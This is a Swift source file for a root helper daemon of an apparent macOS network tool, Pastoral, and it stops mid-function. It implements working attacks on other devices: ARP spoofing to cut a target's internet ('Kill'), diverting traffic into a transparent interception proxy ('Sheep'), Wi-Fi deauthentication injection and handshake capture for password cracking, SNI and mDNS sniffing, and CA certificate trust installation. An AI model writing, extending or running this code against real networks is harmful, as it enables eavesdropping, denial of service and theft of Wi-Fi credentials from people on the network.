import Foundation
import Darwin
import PastoralCore
import PastoralBPFShim

// MARK: - Configuration

// Default socket lives in /var/run (needs root, created by launchd or the
// helper). For local testing without root, override with PASTORAL_SOCKET.
let socketPath = ProcessInfo.processInfo.environment["PASTORAL_SOCKET"] ?? "/var/run/pastoral.sock"

// MARK: - BPF reset (ChmodBPF equivalent)
//
// ChmodBPF does not survive a reboot: /dev/bpf* devices are recreated by
// the kernel on demand with root:wheel 0600. We re-apply the group + perms
// on every helper start so the unprivileged app (member of access_bpf) can
// open a BPF device for pcap. The pastoral-reset LaunchDaemon also does
// this at boot (RunAtLoad=true) as a belt-and-suspenders measure.
func resetBPF() {
    let probe = LiveSystemProbe()
    let gid = probe.accessBPFGroupID()
    let groupArg = gid.map { String($0) } ?? "access_bpf"
    // chgrp access_bpf /dev/bpf* ; chmod g+rw /dev/bpf*
    let script = """
    for f in /dev/bpf*; do
        [ -e "$f" ] || continue
        chgrp \(groupArg) "$f" 2>/dev/null
        chmod g+rw "$f" 2>/dev/null
    done
    """
    runShell(script)
}

@discardableResult
func runShell(_ script: String) -> Int32 {
    let p = Process()
    p.executableURL = URL(fileURLWithPath: "/bin/sh")
    p.arguments = ["-c", script]
    p.standardOutput = FileHandle.standardError
    p.standardError = FileHandle.standardError
    do { try p.run(); p.waitUntilExit() } catch { return -1 }
    return p.terminationStatus
}

// MARK: - Socket setup

/// Hand the control socket file to the console (GUI) login itself:
/// file owner = that user, mode 0600. Deliberately NOT group-based:
/// this machine's dscache serves stale group lists to live processes
/// long after dscl commits membership, so a group bit (root:access_bpf
/// 0660) randomly locked the app out of its own helper. Owner bits
/// never depend on group lookups. If the console user can't be
/// resolved (headless/lookup failure) we fall back to root-owned 0600. No console login means no unprivileged access.
func applySocketPerms(path: String) {
    // Best-effort, independent of the socket: grant the GUI login the
    // BPF device group too (useful for manual Wireshark/tcpdump).
    _ = ensureConsoleUserInGroup(name: "access_bpf")
    refreshSocketOwnership(path: path)
    if socketPermWatcher == nil {
        let t = DispatchSource.makeTimerSource(queue: .global())
        t.schedule(deadline: .now() + 30, repeating: 30)
        t.setEventHandler { refreshSocketOwnership(path: path) }
        socketPermWatcher = t
        t.resume()
    }
}

// Retained so the ownership re-check timer outlives main's setup scope.
nonisolated(unsafe) var socketPermWatcher: DispatchSourceTimer?

/// uid of the GUI login, or nil when unknown/root/headless.
func consoleUID() -> uid_t? {
    let user = consoleUser()
    guard !user.isEmpty, user != "root", let pw = getpwnam(user) else { return nil }
    return pw.pointee.pw_uid
}

func refreshSocketOwnership(path: String) {
    var st = stat()
    guard stat(path, &st) == 0 else { return }
    let current = st.st_mode & 0o777
    if let uid = consoleUID() {
        if st.st_uid != uid || current != 0o600 {
            _ = chown(path, uid, 0)
            _ = chmod(path, 0o600)
        }
    } else if st.st_uid != 0 || current != 0o600 {
        _ = chown(path, 0, 0)
        _ = chmod(path, 0o600)
    }
}

/// Best-effort: add the current console (GUI) login to the named group
/// so a freshly installed helper never locks the app out of its own
/// control socket. Safe to call repeatedly; dscl is a no-op when the
/// membership already exists.
func ensureConsoleUserInGroup(name: String) {
    let user = consoleUser()
    guard !user.isEmpty, user != "root",
          user.allSatisfy({ $0.isLetter || $0.isNumber || $0 == "." || $0 == "_" }) else { return }
    _ = runShell("dscl . -append /Groups/\(name) -attribute member '\(user)'")
}

/// The GUI login owning /dev/console; "" when unknown or headless.
func consoleUser() -> String {
    let p = Process()
    p.executableURL = URL(fileURLWithPath: "/usr/bin/stat")
    p.arguments = ["-f", "%Su", "/dev/console"]
    let out = Pipe()
    p.standardOutput = out
    p.standardError = Pipe()
    do { try p.run(); p.waitUntilExit() } catch { return "" }
    return String(decoding: out.fileHandleForReading.readDataToEndOfFile(),
                  as: UTF8.self).trimmingCharacters(in: .whitespacesAndNewlines)
}


enum SocketSource {
    case launchd(fd: Int32)
    case owned(fd: Int32)   // we created it; we unlink on exit
}

func makeListener() -> SocketSource? {
    // 1) launchd socket activation.
    if let fds = LaunchSocketActivation.acquire(), let fd = fds.first {
        applySocketPerms(path: socketPath)
        return .launchd(fd: fd)
    }

    // 2) Fallback: create the socket ourselves (manual run / testing).
    unlink(socketPath)
    let fd = socket(AF_UNIX, SOCK_STREAM, 0)
    guard fd >= 0 else { return nil }
    var addr = sockaddr_un()
    addr.sun_family = sa_family_t(AF_UNIX)
    socketPath.withCString { path in
        withUnsafeMutableBytes(of: &addr.sun_path) { buf in
            let count = min(strlen(path), buf.count - 1)
            buf.copyBytes(from: UnsafeRawBufferPointer(start: path, count: count))
        }
    }
    let bindResult = withUnsafePointer(to: &addr) { addrPtr in
        addrPtr.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
            bind(fd, sa, socklen_t(MemoryLayout<sockaddr_un>.size))
        }
    }
    guard bindResult == 0, listen(fd, 16) == 0 else {
        close(fd)
        return nil
    }
    applySocketPerms(path: socketPath)
    return .owned(fd: fd)
}

// MARK: - Line I/O over a connection fd

func readLine(from fd: Int32) -> String? {
    var buffer = Data()
    var byte: UInt8 = 0
    while true {
        let n = read(fd, &byte, 1)
        if n == 0 {
            return buffer.isEmpty ? nil : String(data: buffer, encoding: .utf8)
        }
        if n < 0 {
            if errno == EINTR { continue }
            return nil
        }
        if byte == 0x0A { break }   // newline
        buffer.append(byte)
    }
    return String(data: buffer, encoding: .utf8)
}

func writeAll(_ fd: Int32, _ data: Data) {
    data.withUnsafeBytes { raw in
        var remaining = raw.count
        var ptr = raw.baseAddress!
        while remaining > 0 {
            let written = write(fd, ptr, remaining)
            if written <= 0 {
                if errno == EINTR { continue }
                return
            }
            ptr = ptr.advanced(by: written)
            remaining -= written
        }
    }
}

// MARK: - Connection handling

let probe = LiveSystemProbe()

// Global managers for the Kill feature. Created once at startup.
// Marked nonisolated(unsafe) — accessed from the accept loop and the
// signal handler thread, single-writer (accept loop) pattern.
nonisolated(unsafe) let pfManager = PFManager()
nonisolated(unsafe) let forwardingManager = ForwardingManager()
nonisolated(unsafe) var spoofer: ARPSpoofer? = nil
/// IPs currently in "divert" (force-path) mode. Tracked separately from
/// kill targets because divert ENABLES forwarding (traffic must flow so
/// Sheep can intercept it), while kill DISABLES forwarding. Forwarding is
/// only restored when no divert targets remain.
nonisolated(unsafe) var divertTargets: Set<String> = []
/// IPs currently in "kill" mode (spoof + drop rule). Tracked separately
/// from divert targets: stopping one must remove only ITS drop rule,
/// and forwarding state decisions depend on which set still has members.
nonisolated(unsafe) var killTargets: Set<String> = []
/// Active QUIC sniffer (nil when not capturing). Observations are
/// written as `quicObservation` response lines to `quicConnFD`.
nonisolated(unsafe) var quicSniffer: QUICSniffer? = nil
/// Connection fd currently receiving QUIC observations (-1 = none).
nonisolated(unsafe) var quicConnFD: Int32 = -1
/// Active mDNS/LLMNR sniffer (nil when not capturing).
nonisolated(unsafe) var mdnsSniffer: MDNSSniffer? = nil
/// Connection fd currently receiving mDNS observations (-1 = none).
nonisolated(unsafe) var mdnsConnFD: Int32 = -1
/// Active Wi-Fi key hound (nil when not capturing).
nonisolated(unsafe) var wifiHound: WiFiHound? = nil
/// Connection fd currently receiving hcx observations (-1 = none).
nonisolated(unsafe) var hcxConnFD: Int32 = -1

func handleConnection(_ connFD: Int32) {
    defer { close(connFD) }
    while let line = readLine(from: connFD) {
        guard !line.isEmpty else { continue }
        let response: HelperResponse
        do {
            let request = try LineCodec.decode(line, as: HelperRequest.self)
            switch request {
            case .scanARP:
                response = handleScanARP()
            case .spoofStart(let targetIP, let gatewayIP):
                response = handleSpoofStart(targetIP: targetIP, gatewayIP: gatewayIP)
            case .spoofStop(let targetIP):
                response = handleSpoofStop(targetIP: targetIP)
            case .divertStart(let targetIP, let gatewayIP, let bidirectional):
                response = handleDivertStart(targetIP: targetIP, gatewayIP: gatewayIP,
                                             bidirectional: bidirectional)
            case .forwardEnable:
                response = handleForwardEnable()
            case .forwardDisable:
                response = handleForwardDisable()
            case .sheepStart(let forceTCPFallback):
                response = handleSheepStart(forceTCPFallback: forceTCPFallback)
            case .sheepStop:
                response = handleSheepStop()
            case .killSelective(let policy):
                response = handleKillSelective(policy: policy)
            case .killSelectiveClear(let targetIP):
                response = handleKillSelectiveClear(targetIP: targetIP)
            case .quicStart(let interface):
                response = handleQuicStart(interface: interface, connFD: connFD)
            case .quicStop:
                response = handleQuicStop()
            case .mdnsStart(let interface):
                response = handleMDNSSnifferStart(interface: interface, connFD: connFD)
            case .mdnsStop:
                response = handleMDNSSnifferStop()
            case .wifiScan:
                response = handleWifiScan()
            case .wifiMonitorOn(let interface, _):
                response = handleWifiMonitor(interface: interface, on: true)
            case .wifiMonitorOff(let interface):
                response = handleWifiMonitor(interface: interface, on: false)
            case .deauthSend(let targetMAC, let bssid, _):
                response = handleDeauthSend(targetMAC: targetMAC, bssid: bssid)
            case .hcxStart(let interface, let essid, let bssid, let seconds):
                response = handleHcxStart(interface: interface, essid: essid,
                                          bssid: bssid, seconds: seconds, connFD: connFD)
            case .hcxStop:
                response = handleHcxStop()
            case .tunnelStart(let config):
                response = handleTunnelStart(config: config)
            case .tunnelStop:
                response = handleTunnelStop()
            case .tunnelStatus:
                response = handleTunnelStatus()
            case .tailscaleUp(let cfg):
                response = handleTailscaleUp(config: cfg)
            case .tailscaleDown:
                response = handleTailscaleDown()
            case .uninstall:
                response = handleUninstall()
            case .portProbe(let targetIP, let ports):
                response = handlePortProbe(targetIP: targetIP, ports: ports)
            case .caTrustInstall(let certPath):
                response = handleCATrustInstall(certPath: certPath)
            case .caTrustRemove(let certPath):
                response = handleCATrustRemove(certPath: certPath)
            default:
                response = CommandDispatcher.handle(request, probe: probe)
            }
        } catch {
            response = .error(message: "decode failed: \(error.localizedDescription)")
        }
        do {
            let data = try LineCodec.encode(response)
            writeAll(connFD, data)
        } catch {
            return
        }
    }
}

// MARK: - Spoof handlers

/// Resolve the MAC for an IP from the kernel ARP table.
func resolveMAC(for ip: String) -> MAC? {
    guard let output = runCapture("/usr/sbin/arp", ["-n", ip]) else { return nil }
    // Format: "10.0.0.5 at aa:bb:cc:dd:ee:ff on en0 ifscope [ethernet]"
    // Or:    "10.0.0.5 (10.0.0.5) at aa:bb:cc:dd:ee:ff on en0 ifscope [ethernet]"
    let pattern = #"at ([0-9a-fA-F]{1,2}(?::[0-9a-fA-F]{1,2}){5})"#
    guard let regex = try? NSRegularExpression(pattern: pattern) else { return nil }
    let nsLine = output as NSString
    let range = NSRange(location: 0, length: nsLine.length)
    if let match = regex.firstMatch(in: output, range: range) {
        let macStr = nsLine.substring(with: match.range(at: 1))
        // Normalize MAC to 2-digit octets (arp may output single-digit).
        let octets = macStr.split(separator: ":").compactMap { UInt8($0, radix: 16) }
        guard octets.count == 6 else { return nil }
        let normalized = octets.map { String(format: "%02x", $0) }.joined(separator: ":")
        return MAC(string: normalized)
    }
    return nil
}

func handleSpoofStart(targetIP: String, gatewayIP: String) -> HelperResponse {
    let iface = probe.defaultInterface() ?? "en0"
    guard let localIPBytes = localIPv4(of: iface) else {
        return .error(message: "no IPv4 on \(iface)")
    }
    guard let localMAC = localMAC(of: iface) else {
        return .error(message: "no MAC on \(iface)")
    }

    // Resolve target and gateway MACs from the ARP table.
    guard let targetMAC = resolveMAC(for: targetIP) else {
        return .error(message: "cannot resolve MAC for \(targetIP)")
    }
    guard let gatewayMAC = resolveMAC(for: gatewayIP) else {
        return .error(message: "cannot resolve MAC for gateway \(gatewayIP)")
    }

    FileHandle.standardError.write("spoof.start: iface=\(iface) localMAC=\(localMAC) target=\(targetIP)/\(targetMAC) gw=\(gatewayIP)/\(gatewayMAC)\n".data(using: .utf8)!)

    // Lazily create the spoofer.
    if spoofer == nil {
        spoofer = ARPSpoofer(interface: iface, localMAC: localMAC, localIP: localIPBytes)
    }

    let ok = spoofer!.startSpoof(targetIP: targetIP, targetMAC: targetMAC,
                                  gatewayIP: gatewayIP, gatewayMAC: gatewayMAC)
    if !ok {
        return .error(message: "failed to start spoof for \(targetIP)")
    }
    killTargets.insert(targetIP)

    // DISABLE IP forwarding so the target's traffic (which now comes to us
    // via ARP spoof) is dropped instead of forwarded. This is the most
    // reliable way to cut internet — no pf needed.
    _ = forwardingManager.disable()
    FileHandle.standardError.write("spoof.start: forwarding disabled (Kill mode)\n".data(using: .utf8)!)

    // Also add pf drop rules as belt-and-suspenders.
    pfManager.addDropRule(for: targetIP)

    return .ok(message: "spoofing \(targetIP) via gateway \(gatewayIP)")
}

func handleSpoofStop(targetIP: String) -> HelperResponse {
    spoofer?.stopSpoof(targetIP: targetIP)
    // Remove from per-mode tracking.
    divertTargets.remove(targetIP)
    killTargets.remove(targetIP)
    // Remove just this target's drop rule — other kill targets keep theirs.
    guard pfManager.removeDropRule(for: targetIP) else {
        return .error(message: "Não foi possível remover as regras de \(targetIP). Tente restaurar novamente.")
    }
    // Forwarding: kill targets need it OFF (their traffic must die at us);
    // divert targets need it ON (traffic must relay to the gateway). Only
    // touch it when the surviving sets actually decide something.
    if !divertTargets.isEmpty {
        // Divert targets still active — traffic keeps flowing through us.
        guard forwardingManager.enable() else {
            return .error(message: "Não foi possível preservar o encaminhamento durante a restauração.")
        }
        FileHandle.standardError.write("spoof.stop: forwarding stays ON (\(divertTargets.count) divert targets active)\n".data(using: .utf8)!)
    } else if killTargets.isEmpty {
        // Nothing left in either mode — restore the pre-Pastoral state.
        guard forwardingManager.restore() else {
            return .error(message: "Não foi possível restaurar o encaminhamento da rede.")
        }
        FileHandle.standardError.write("spoof.stop: forwarding restored (no more targets)\n".data(using: .utf8)!)
    } else {
        FileHandle.standardError.write("spoof.stop: forwarding stays OFF (\(killTargets.count) kill targets active)\n".data(using: .utf8)!)
    }
    return .ok(message: "stopped spoofing \(targetIP)")
}

// MARK: - Divert handlers (force-path mode)

/// Force a target's traffic through us: ARP spoof (uni or bi) + ENABLE
/// forwarding so traffic flows instead of being dropped. No pf drop rules.
/// This is the lever that makes Sheep MITM work even when we are not the
/// target's natural gateway. Stopped with `spoofStop`.
func handleDivertStart(targetIP: String, gatewayIP: String,
                       bidirectional: Bool) -> HelperResponse {
    let iface = probe.defaultInterface() ?? "en0"
    guard let localIPBytes = localIPv4(of: iface) else {
        return .error(message: "no IPv4 on \(iface)")
    }
    guard let localMAC = localMAC(of: iface) else {
        return .error(message: "no MAC on \(iface)")
    }

    // Resolve target and gateway MACs from the ARP table.
    guard let targetMAC = resolveMAC(for: targetIP) else {
        return .error(message: "cannot resolve MAC for \(targetIP)")
    }
    guard let gatewayMAC = resolveMAC(for: gatewayIP) else {
        return .error(message: "cannot resolve MAC for gateway \(gatewayIP)")
    }

    let mode = bidirectional ? "bidirectional" : "unidirectional"
    FileHandle.standardError.write("divert.start: iface=\(iface) localMAC=\(localMAC) target=\(targetIP)/\(targetMAC) gw=\(gatewayIP)/\(gatewayMAC) \(mode)\n".data(using: .utf8)!)

    // Divert ENABLES forwarding so the target's traffic (which now comes
    // to us via ARP spoof) is relayed to the real gateway instead of
    // dropped. This is the opposite of Kill mode. Sheep's rdr rules then
    // redirect port 80/443 to the local proxy for interception.
    //
    // CRITICAL: forwarding MUST be enabled BEFORE spoofing starts.
    // Otherwise there's a window where the target's traffic arrives at
    // us but gets dropped because forwarding isn't on yet — the device
    // loses connectivity during that window.
    _ = forwardingManager.enable()
    FileHandle.standardError.write("divert.start: forwarding enabled (force-path mode)\n".data(using: .utf8)!)

    // Lazily create the spoofer.
    if spoofer == nil {
        spoofer = ARPSpoofer(interface: iface, localMAC: localMAC, localIP: localIPBytes)
    }

    let ok = spoofer!.startSpoof(targetIP: targetIP, targetMAC: targetMAC,
                                  gatewayIP: gatewayIP, gatewayMAC: gatewayMAC,
                                  bidirectional: bidirectional)
    if !ok {
        // Spoof failed: don't track a dead divert, and put forwarding
        // back down if nothing else needs it up.
        divertTargets.remove(targetIP)
        if killTargets.isEmpty && divertTargets.isEmpty {
            _ = forwardingManager.disable()
        }
        return .error(message: "failed to start divert for \(targetIP)")
    }
    divertTargets.insert(targetIP)

    return .ok(message: "diverting \(targetIP) via gateway \(gatewayIP) (\(mode))")
}

// MARK: - Forwarding handlers

func handleForwardEnable() -> HelperResponse {
    let ok = forwardingManager.enable()
    return ok ? .ok(message: "forwarding enabled") : .error(message: "failed to enable forwarding")
}

func handleForwardDisable() -> HelperResponse {
    let ok = forwardingManager.restore()
    return ok ? .ok(message: "forwarding restored") : .error(message: "failed to restore forwarding")
}

// MARK: - Sheep handlers (pf rdr)

func handleSheepStart(forceTCPFallback: Bool = true) -> HelperResponse {
    // Ensure the sheep anchor include is in pf.conf.
    var contents = ""
    if let data = try? Data(contentsOf: URL(fileURLWithPath: PFManager.pfConfPath)) {
        contents = String(data: data, encoding: .utf8) ?? ""
    }
    if !PFAnchorManager.hasSheepAnchor(in: contents) {
        let updated = PFAnchorManager.ensureSheepAnchor(in: contents)
        try? updated.data(using: .utf8)?.write(to: URL(fileURLWithPath: PFManager.pfConfPath))
        runShell("pfctl -f \(PFManager.pfConfPath) 2>/dev/null || true")
    }

    // Wildcard rdr: whatever TCP/80|443 enters the default interface
    // (forwarded traffic from diverted hosts) goes to the local proxy.
    // The Mac's own IP is excluded from the QUIC block so local HTTP/3
    // keeps working.
    let iface = probe.defaultInterface() ?? "en0"
    let localIP = localIPv4(of: iface).map { $0.map(String.init).joined(separator: ".") }
    let rules = PFAnchorManager.transparentRules(
        interface: iface,
        forceTCPFallback: forceTCPFallback,
        localIP: localIP)
    let tmp = "/tmp/pastoral-sheep-rdr.conf"
    try? rules.data(using: .utf8)?.write(to: URL(fileURLWithPath: tmp))
    runShell("pfctl -a \(PFAnchorManager.sheepAnchor) -f \(tmp) 2>/dev/null; rm -f \(tmp)")

    // Enable IP forwarding so the redirected traffic can flow.
    _ = forwardingManager.enable()

    return .ok(message: "sheep: proxy transparente ativo em \(iface)")
}

func handleSheepStop() -> HelperResponse {
    // Flush translation rules as well as filter rules, only in our anchor.
    guard runShell("pfctl -a \(PFAnchorManager.sheepAnchor) -F all 2>&1") == 0 else {
        return .error(message: "Não foi possível remover o redirecionamento. A restauração continua pendente.")
    }
    do {
        let contents = try String(contentsOfFile: PFManager.pfConfPath, encoding: .utf8)
        let updated = PFAnchorManager.removeSheepAnchor(from: contents)
        if updated != contents {
            try updated.write(toFile: PFManager.pfConfPath, atomically: true, encoding: .utf8)
            guard runShell("pfctl -f \(PFManager.pfConfPath) 2>&1") == 0 else {
                return .error(message: "Não foi possível recarregar a configuração após remover o redirecionamento.")
            }
        }
    } catch { return .error(message: "Falha ao salvar a restauração: \(error.localizedDescription)") }
    if divertTargets.isEmpty && killTargets.isEmpty {
        guard forwardingManager.restore() else {
            return .error(message: "Não foi possível restaurar o encaminhamento da rede.")
        }
    }
    return .ok(message: "Redirecionamento removido.")
}

// MARK: - Selective Kill handlers (phase 3)

/// Apply a selective Kill policy: drop or rate-limit traffic from the
/// target filtered by port/protocol/DSCP. Uses dedicated pf anchors so
/// selective rules don't interfere with the total-drop kill anchor.
func handleKillSelective(policy: KillPolicy) -> HelperResponse {
    // Ensure the selective + dummynet anchor includes are in pf.conf.
    ensureSelectiveAnchors()

    if let kbit = policy.rateLimitKbit {
        // Rate-limit mode: load dummynet pipe config + pass/dnpipe rules.
        let pipeConfig = PFSelectiveRules.pipeConfig(for: policy) ?? ""
        let rule = PFSelectiveRules.rateLimitRule(for: policy)
        // Load pipe config into the dummynet anchor.
        let pipeTmp = "/tmp/pastoral-dummynet-\(policy.pipeID).conf"
        try? pipeConfig.data(using: .utf8)?.write(to: URL(fileURLWithPath: pipeTmp))
        runShell("pfctl -a \(PFAnchorManager.dummynetAnchor) -f \(pipeTmp) 2>/dev/null; rm -f \(pipeTmp)")
        // Load pass/dnpipe rules into the selective anchor.
        let ruleTmp = "/tmp/pastoral-selective-\(policy.targetIP.replacingOccurrences(of: ".", with: "-"))-\(kbit).conf"
        try? rule.data(using: .utf8)?.write(to: URL(fileURLWithPath: ruleTmp))
        runShell("pfctl -a \(PFAnchorManager.selectiveAnchor) -f \(ruleTmp) 2>/dev/null; rm -f \(ruleTmp)")
        return .ok(message: "kill.selective: rate-limit \(kbit)Kbit/s para \(policy.targetIP)")
    }

    // Drop mode: load block rules into the selective anchor.
    let rule = PFSelectiveRules.dropRule(for: policy)
    let ruleTmp = "/tmp/pastoral-selective-\(policy.targetIP.replacingOccurrences(of: ".", with: "-")).conf"
    try? rule.data(using: .utf8)?.write(to: URL(fileURLWithPath: ruleTmp))
    runShell("pfctl -a \(PFAnchorManager.selectiveAnchor) -f \(ruleTmp) 2>/dev/null; rm -f \(ruleTmp)")
    let detail = policy.ports.isEmpty
        ? "todas as portas"
        : "portas \(policy.ports.map(String.init).joined(separator: ","))"
    return .ok(message: "kill.selective: drop \(policy.targetIP) (\(detail))")
}

/// Clear all selective Kill rules for a target IP from both the
/// selective and dummynet anchors.
func handleKillSelectiveClear(targetIP: String) -> HelperResponse {
    // Clearing per-target from an anchor requires reloading the anchor
    // without the target's rules. The simplest robust approach: flush the
    // whole selective + dummynet anchors. Selective rules are expected to
    // be few and re-applied by the app as needed.
    let selective = runShell("pfctl -a \(PFAnchorManager.selectiveAnchor) -F all 2>&1")
    let dummynet = runShell("pfctl -a \(PFAnchorManager.dummynetAnchor) -F all 2>&1")
    guard selective == 0 && dummynet == 0 else {
        return .error(message: "Não foi possível remover todas as regras seletivas.")
    }
    return .ok(message: "Regras seletivas removidas.")
}

/// Ensure the selective + dummynet anchor include lines are in pf.conf,
/// and that ALL pastoral anchors sit in canonical evaluation order
/// (selective/dummynet BEFORE sheep's wildcard rdr — otherwise a
/// redirected packet never reaches the cut/throttle rules while Sheep is
/// active, which would silently neuter Lobo's pulse and throttle).
func ensureSelectiveAnchors() {
    var contents = ""
    if let data = try? Data(contentsOf: URL(fileURLWithPath: PFManager.pfConfPath)) {
        contents = String(data: data, encoding: .utf8) ?? ""
    }
    let updated = PFAnchorManager.orderedPastoralAnchors(
        in: contents,
        ensuring: [PFAnchorManager.selectiveIncludeLine,
                   PFAnchorManager.dummynetIncludeLine])
    if updated != contents {
        try? updated.data(using: .utf8)?.write(to: URL(fileURLWithPath: PFManager.pfConfPath))
        runShell("pfctl -f \(PFManager.pfConfPath) 2>/dev/null || true")
    }
}

// MARK: - QUIC sniffer handlers

/// Start passive QUIC/HTTP3 sniffing on `interface`. Observations are
/// written back to `connFD` as `quicObservation` response lines, one per
/// deduped Initial packet. The connection stays open; the client reads
/// lines as they arrive.
func handleQuicStart(interface: String, connFD: Int32) -> HelperResponse {
    // Stop any existing sniffer first.
    quicSniffer?.stop()
    quicSniffer = nil
    quicConnFD = -1

    let iface = interface.isEmpty ? (probe.defaultInterface() ?? "en0") : interface
    let sniffer = QUICSniffer(interface: iface) { obs in
        // Emit a `quicObservation` line back to the requesting connection.
        guard quicConnFD >= 0 else { return }
        let resp: HelperResponse = .quicObservation(
            sourceIP: obs.sourceIP,
            destIP: obs.destIP,
            sni: obs.sni,
            alpn: obs.alpn,
            version: obs.version
        )
        guard let data = try? LineCodec.encode(resp) else { return }
        writeAll(quicConnFD, data)
    }
    if sniffer.start() {
        quicSniffer = sniffer
        quicConnFD = connFD
        return .ok(message: "quic: sniffing on \(iface)")
    }
    return .error(message: "quic: no BPF device available on \(iface)")
}

func handleQuicStop() -> HelperResponse {
    quicSniffer?.stop()
    quicSniffer = nil
    quicConnFD = -1
    return .ok(message: "quic: stopped")
}

// MARK: - mDNS/LLMNR sniffer handlers (phase 4)

func handleMDNSSnifferStart(interface: String, connFD: Int32) -> HelperResponse {
    mdnsSniffer?.stop()
    mdnsSniffer = nil
    mdnsConnFD = -1

    let iface = interface.isEmpty ? (probe.defaultInterface() ?? "en0") : interface
    let sniffer = MDNSSniffer(interface: iface) { obs in
        guard mdnsConnFD >= 0 else { return }
        for svc in obs.services {
            let resp: HelperResponse = .mdnsObservation(
                sourceIP: obs.sourceIP,
                serviceType: svc.serviceType,
                instance: svc.instance,
                hostname: svc.hostname,
                port: svc.port,
                addresses: svc.addresses
            )
            if let data = try? LineCodec.encode(resp) {
                writeAll(mdnsConnFD, data)
            }
        }
        // Emit pure queries (questions with no answers) as observations too.
        if obs.services.isEmpty, let msg = obs.message, !msg.questions.isEmpty {
            let resp: HelperResponse = .mdnsObservation(
                sourceIP: obs.sourceIP,
                serviceType: msg.questions.first?.name ?? "",
                instance: "",
                hostname: nil,
                port: nil,
                addresses: []
            )
            if let data = try? LineCodec.encode(resp) {
                writeAll(mdnsConnFD, data)
            }
        }
    }
    if sniffer.start() {
        mdnsSniffer = sniffer
        mdnsConnFD = connFD
        return .ok(message: "mdns: sniffing on \(iface)")
    }
    return .error(message: "mdns: no BPF device available on \(iface)")
}

func handleMDNSSnifferStop() -> HelperResponse {
    mdnsSniffer?.stop()
    mdnsSniffer = nil
    mdnsConnFD = -1
    return .ok(message: "mdns: stopped")
}

// MARK: - Wi-Fi "caça-senha" handlers

func handleWifiScan() -> HelperResponse {
    let nets = AirportScanner.scan()
    guard !nets.isEmpty else {
        return .error(message: "nenhuma rede visível (Wi-Fi desligado?)")
    }
    return .wifiNetworks(networks: nets)
}

func handleWifiMonitor(interface: String, on: Bool) -> HelperResponse {
    let r = pastoral_set_promisc(interface, on ? 1 : 0)
    if r == 0 {
        return .ok(message: "promisc \(on ? "ligado" : "desligado") em \(interface)")
    }
    return .error(message: "ioctl promisc falhou em \(interface) (errno \(errno))")
}

func handleDeauthSend(targetMAC: String, bssid: String) -> HelperResponse {
    func macBytes(_ s: String) -> [UInt8]? {
        let parts = s.split(separator: ":").compactMap { UInt8($0, radix: 16) }
        return parts.count == 6 ? parts : nil
    }
    guard let t = macBytes(targetMAC), let b = macBytes(bssid) else {
        return .error(message: "MAC inválido no deauth")
    }
    if DeauthInjector.inject(targetMAC: t, bssid: b) {
        return .ok(message: "deauth injetado para \(targetMAC)")
    }
    return .error(message: "injeção de deauth falhou (sem canal BPF/pcap)")
}

func handleHcxStart(interface: String, essid: String, bssid: String,
                    seconds: Int, connFD: Int32) -> HelperResponse {
    wifiHound?.stop()
    wifiHound = nil
    hcxConnFD = -1

    let iface = interface.isEmpty ? (probe.defaultInterface() ?? "en0") : interface
    let hound = WiFiHound(interface: iface, essid: essid, bssid: bssid, seconds: seconds) { cap in
        guard hcxConnFD >= 0 else { return }
        let resp: HelperResponse = .hcxCapture(capture: cap)
        guard let data = try? LineCodec.encode(resp) else { return }
        writeAll(hcxConnFD, data)
    }
    if hound.start() {
        wifiHound = hound
        hcxConnFD = connFD
        let label = bssid.isEmpty ? essid : bssid
        return .ok(message: "hcx: capturando em \(iface)\(label.isEmpty ? "" : " (\(label))")")
    }
    return .error(message: "hcx: sem dispositivo BPF em \(iface)")
}

func handleHcxStop() -> HelperResponse {
    wifiHound?.stop()
    wifiHound = nil
    hcxConnFD = -1
    return .ok(message: "hcx: parado")
}

// MARK: - WireGuard/Tailscale tunnel handlers (phase 6)

/// Active WireGuard interface name (nil when no tunnel is up).
nonisolated(unsafe) var activeWGInterface: String? = nil

func handleTunnelStart(config: String) -> HelperResponse {
    // Tear down any existing tunnel first.
    if let iface = activeWGInterface {
        _ = runCommand("/usr/local/bin/wg-quick", args: ["down", iface])
        activeWGInterface = nil
    }
    // Write the config to a temp file. wg-quick expects the filename to
    // match the interface name (e.g. /etc/wireguard/pastoral0.conf → wg0).
    // We use a fixed interface name "pastoral0" for simplicity.
    let iface = "pastoral0"
    let confPath = "/etc/wireguard/\(iface).conf"
    do {
        try config.write(toFile: confPath, atomically: true, encoding: .utf8)
        // Restrict permissions: WireGuard configs contain private keys.
        _ = runCommand("/bin/chmod", args: ["600", confPath])
    } catch {
        return .error(message: "tunnel: failed to write config: \(error)")
    }
    let result = runCommand("/usr/local/bin/wg-quick", args: ["up", iface])
    if result.status == 0 {
        activeWGInterface = iface
        return .ok(message: "tunnel: \(iface) up")
    }
    return .error(message: "tunnel: wg-quick up failed: \(result.output)")
}

func handleTunnelStop() -> HelperResponse {
    guard let iface = activeWGInterface else {
        return .ok(message: "tunnel: no active tunnel")
    }
    let result = runCommand("/usr/local/bin/wg-quick", args: ["down", iface])
    activeWGInterface = nil
    // Remove the config file.
    _ = runCommand("/bin/rm", args: ["-f", "/etc/wireguard/\(iface).conf"])
    if result.status == 0 {
        return .ok(message: "tunnel: \(iface) down")
    }
    return .error(message: "tunnel: wg-quick down failed: \(result.output)")
}

func handleTunnelStatus() -> HelperResponse {
    guard let iface = activeWGInterface else {
        return .tunnelStatus(interface: nil, handshake: nil, rx: 0, tx: 0)
    }
    // `wg show` output includes "latest handshake" and "transfer" lines.
    let result = runCommand("/usr/local/bin/wg", args: ["show", iface])
    if result.status != 0 {
        return .tunnelStatus(interface: iface, handshake: nil, rx: 0, tx: 0)
    }
    // Parse the output for handshake and transfer stats.
    var handshake: Int? = nil
    var rx: UInt64 = 0
    var tx: UInt64 = 0
    for line in result.output.split(separator: "\n") {
        let trimmed = line.trimmingCharacters(in: .whitespaces)
        if trimmed.contains("latest handshake") {
            // e.g. "latest handshake: 4 seconds ago"
            let parts = trimmed.split(separator: " ")
            for (i, p) in parts.enumerated() {
                if p == "seconds" && i > 0, let n = Int(parts[i - 1]) {
                    handshake = n
                }
            }
        } else if trimmed.contains("transfer") {
            // e.g. "transfer: 1.23 KiB received, 4.56 KiB sent"
            let parts = trimmed.split(separator: ",")
            for p in parts {
                let lower = p.lowercased()
                if lower.contains("received") {
                    rx = parseBytes(String(p))
                } else if lower.contains("sent") {
                    tx = parseBytes(String(p))
                }
            }
        }
    }
    return .tunnelStatus(interface: iface, handshake: handshake, rx: rx, tx: tx)
}

func handleTailscaleUp(config: TailscaleConfig) -> HelperResponse {
    guard let args = config.renderUpArgs() else {
        return .error(message: "tailscale: empty config")
